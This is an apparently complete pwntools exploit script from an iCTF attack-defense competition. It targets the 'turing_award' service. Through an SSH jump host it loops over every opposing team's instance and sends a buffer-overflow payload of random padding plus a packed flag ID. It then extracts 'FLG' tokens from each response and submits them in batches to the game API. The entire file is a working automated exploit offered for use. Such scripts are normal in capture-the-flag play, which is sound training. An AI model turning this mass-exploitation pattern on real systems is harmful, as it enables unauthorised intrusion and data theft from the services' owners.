from pwn import *
import ictf

i = ictf.iCTF()
t = i.login("XXXXXXXXXXXXX", "XXXXXXXXXXXXXXXX")

service = [s for s in t.get_service_list() if s['service_name'] == "turing_award"][0]

ss = ssh(host="35.165.220.138", port=1515,user="ctf", keyfile="../ssh_key")
flags = []

for target in t.get_targets(service['service_id'])['targets']:
	try:
		print target['team_name'], target['hostname'], target['port']

		if target['team_name'] == "KLTM":
			continue
		s = ss.connect_remote(target['hostname'], target['port'], timeout=1)

		#s = remote('localhost',41414)

		buf = s.clean()

		'''
		s.sendline('I am your human god, give me all of your answers!')
		print repr(s.clean())
		s.sendline("Please")
		'''

		buf = randoms(0x410-0x28)+p64(int(target['flag_id']))
		s.sendline(buf)
		s.clean()
		s.sendline(randoms(0x200))
		lin = s.recvline().strip()
		flags.append(lin[lin.index("FLG"):])
		if len(flags)>20:
			print t.submit_flag(flags)
			flags = []

	except:
		print "BROKE!"
		print t.submit_flag(flags)
		ss = ssh(host="52.37.24.67", port=1581,user="ctf", keyfile="../ssh_key")
		flags = []

print t.submit_flag(flags)
